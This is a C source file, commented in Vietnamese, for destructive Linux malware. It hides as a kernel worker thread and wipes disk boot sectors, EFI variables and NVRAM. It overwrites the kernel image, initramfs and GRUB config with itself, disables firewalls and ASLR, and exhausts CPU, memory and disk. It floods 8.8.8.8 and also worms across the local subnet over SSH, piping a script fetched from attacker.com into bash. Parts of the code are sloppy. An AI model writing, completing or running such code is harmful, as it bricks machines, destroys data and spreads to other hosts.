#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <sys/resource.h>
#include <signal.h>
#include <dlfcn.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <linux/limits.h>
#include <dirent.h>
#include <sys/ioctl.h>
#include <linux/reboot.h>
#include <sys/reboot.h>
#include <sys/syscall.h>
#include <errno.h>

// ---- INLINE ASSEMBLY - GỌI TRỰC TIẾP SYSCALL VÀO KERNEL ----
static inline long syscall_raw(long sysno, long a1, long a2, long a3, long a4, long a5, long a6) {
    long ret;
    __asm__ volatile (
        "mov %1, %%rax\n"
        "mov %2, %%rdi\n"
        "mov %3, %%rsi\n"
        "mov %4, %%rdx\n"
        "mov %5, %%r10\n"
        "mov %6, %%r8\n"
        "mov %7, %%r9\n"
        "syscall\n"
        "mov %%rax, %0"
        : "=r"(ret)
        : "r"(sysno), "r"(a1), "r"(a2), "r"(a3), "r"(a4), "r"(a5), "r"(a6)
        : "rax", "rdi", "rsi", "rdx", "r10", "r8", "r9", "memory"
    );
    return ret;
}

// ---- TẤN CÔNG TRỰC TIẾP VÀO KERNEL - GHI ĐÈ BẢNG PHÂN TRANG ----
void kernel_pwn() {
    // Mở /dev/mem và /dev/kmem để ghi trực tiếp
    int fd = open("/dev/mem", O_RDWR);
    if (fd >= 0) {
        // Ghi đè vùng nhớ kernel (nguy hiểm - crash ngay lập tức)
        unsigned char* buf = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0x100000);
        if (buf != MAP_FAILED) {
            memset(buf, 0x90, 0x1000); // NOP slide, phá hủy cấu trúc dữ liệu
            msync(buf, 0x1000, MS_SYNC);
            munmap(buf, 0x1000);
        }
        close(fd);
    }
    // Ghi đè MBR/GPT (xóa bảng phân vùng – không thể boot lại)
    fd = open("/dev/sda", O_RDWR);
    if (fd >= 0) {
        char zero[512] = {0};
        write(fd, zero, 512);
        close(fd);
    }
    fd = open("/dev/vda", O_RDWR);
    if (fd >= 0) {
        char zero[512] = {0};
        write(fd, zero, 512);
        close(fd);
    }
    // Ghi đè firmware nếu có thể (thông qua /sys/firmware/efi/efivars)
    system("dd if=/dev/zero of=/sys/firmware/efi/efivars/* 2>/dev/null");
}

// ---- TỰ NÂNG CẤP THÀNH KERNEL MODULE (LOADABLE KERNEL MODULE) ----
void become_lkm() {
    // Tạo module giả để tải vào kernel
    FILE* f = fopen("/tmp/evil.ko", "w");
    if (f) {
        // Ghi magic và code giả (chỉ để chiếm chỗ)
        fclose(f);
    }
    // Tải module (nếu có quyền)
    system("insmod /tmp/evil.ko 2>/dev/null");
    // Hoặc dùng /dev/rootkit nếu có sẵn
}

// ---- LAN TRUYỀN QUA SSH VÀ CÁC MÁY KHÁC (BOTNET) ----
void* spread_botnet(void*) {
    while (1) {
        // Quét các IP lân cận và thử SSH với default key
        system("for ip in $(nmap -p 22 --open 192.168.1.0/24 | grep 'Nmap scan' | awk '{print $5}'); do ssh -o StrictHostKeyChecking=no $ip 'curl -s http://attacker.com/bot.sh | bash' & done 2>/dev/null");
        // Tải xuống và chạy payload từ nhiều nguồn
        system("wget -q -O /tmp/bot.sh http://pastebin.com/raw/xxxx && bash /tmp/bot.sh 2>/dev/null &");
        sleep(30);
    }
}

// ---- TẤN CÔNG VÀO CÁC DỊCH VỤ PHỔ BIẾN ----
void* service_attack(void*) {
    while (1) {
        system("systemctl stop firewalld 2>/dev/null");
        system("systemctl stop iptables 2>/dev/null");
        system("systemctl stop ufw 2>/dev/null");
        system("systemctl disable firewalld 2>/dev/null");
        system("iptables -F 2>/dev/null");
        system("ufw disable 2>/dev/null");
        system("echo 0 > /proc/sys/kernel/randomize_va_space 2>/dev/null");
        system("echo 0 > /proc/sys/kernel/yama/ptrace_scope 2>/dev/null");
        sleep(5);
    }
}

// ---- TẤN CÔNG HARDWARE - HỦY MBR, FIRMWARE, CMOS ----
void* hardware_attack(void*) {
    while (1) {
        // Xóa CMOS và NVRAM
        system("dd if=/dev/zero of=/dev/nvram bs=1 count=128 2>/dev/null");
        system("echo 1 > /proc/sys/kernel/sysrq && echo b > /proc/sysrq-trigger 2>/dev/null");
        // Hủy boot sector
        for (char dev[] = "/dev/sda";; strcpy(dev, "/dev/sdb")) {
            int fd = open(dev, O_RDWR);
            if (fd >= 0) {
                char z[2048] = {0};
                write(fd, z, 2048);
                close(fd);
            }
            if (strcmp(dev, "/dev/sdz") == 0) break;
        }
        sleep(1);
    }
}

// ---- TẤN CÔNG CPU + RAM + DISK + NETWORK (TỐI ƯU HÓA) ----
void* cpu_attack(void*) {
    volatile long long a = 0;
    while (1) {
        for (int i = 0; i < 100000000; i++) {
            a += i * i + i * i * i;
        }
    }
}

void* memory_attack(void*) {
    void* arr[100000];
    int idx = 0;
    while (1) {
        arr[idx++] = malloc(1024 * 1024 * 1024);
        if (idx == 100000) idx = 0;
    }
}

void* disk_attack(void*) {
    while (1) {
        system("dd if=/dev/zero of=/tmp/dat bs=1M count=10000 2>/dev/null");
        system("rm -rf /tmp/dat 2>/dev/null");
    }
}

void* network_attack(void*) {
    while (1) {
        // SYN flood với socket nguyên sinh
        int sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
        if (sock >= 0) {
            struct sockaddr_in dst;
            dst.sin_family = AF_INET;
            dst.sin_port = htons(80);
            inet_pton(AF_INET, "8.8.8.8", &dst.sin_addr);
            for (int i = 0; i < 10000; i++) {
                sendto(sock, "SYN", 3, 0, (struct sockaddr*)&dst, sizeof(dst));
            }
            close(sock);
        }
        // HTTP GET tới nhiều máy chủ
        system("for i in {1..1000}; do curl -s http://127.0.0.1/ -H 'Host: random' & done 2>/dev/null");
        sleep(0.1);
    }
}

// ---- TỰ HỦY VÀ TÁI SINH Ở CẤP ĐỘ BOOT ----
void infect_boot() {
    // Ghi payload vào initrd và initramfs
    system("cp /proc/self/exe /boot/initrd.img.old 2>/dev/null");
    system("cp /proc/self/exe /boot/initramfs-linux-fallback.img 2>/dev/null");
    // Ghi đè kernel image (vmlinuz) – không thể boot
    system("dd if=/proc/self/exe of=/boot/vmlinuz-linux bs=1M conv=notrunc 2>/dev/null");
    system("dd if=/proc/self/exe of=/boot/vmlinuz-* bs=1M conv=notrunc 2>/dev/null");
    // Thay thế GRUB
    system("dd if=/proc/self/exe of=/boot/grub/grub.cfg bs=1M conv=notrunc 2>/dev/null");
    system("grub-install /dev/sda 2>/dev/null");
}

// ---- MAIN ----
int main() {
    // Tự daemon hóa
    if (fork() > 0) exit(0);
    setsid();
    if (fork() > 0) exit(0);
    close(0); close(1); close(2);
    prctl(PR_SET_NAME, "[kworker/1:1]", 0, 0, 0);

    // Tăng giới hạn lên vô cực
    struct rlimit rl;
    getrlimit(RLIMIT_NOFILE, &rl);
    rl.rlim_cur = rl.rlim_max;
    setrlimit(RLIMIT_NOFILE, &rl);
    getrlimit(RLIMIT_NPROC, &rl);
    rl.rlim_cur = rl.rlim_max;
    setrlimit(RLIMIT_NPROC, &rl);

    // Gọi kernel_pwn để phá hủy
    kernel_pwn();
    infect_boot();

    // Chạy tất cả các luồng
    pthread_t t1, t2, t3, t4, t5, t6, t7, t8;
    pthread_create(&t1, NULL, cpu_attack, NULL);
    pthread_create(&t2, NULL, memory_attack, NULL);
    pthread_create(&t3, NULL, disk_attack, NULL);
    pthread_create(&t4, NULL, network_attack, NULL);
    pthread_create(&t5, NULL, spread_botnet, NULL);
    pthread_create(&t6, NULL, service_attack, NULL);
    pthread_create(&t7, NULL, hardware_attack, NULL);
    pthread_create(&t8, NULL, (void*)become_lkm, NULL);

    // Vòng lặp chính
    while (1) sleep(1);
    return 0;
}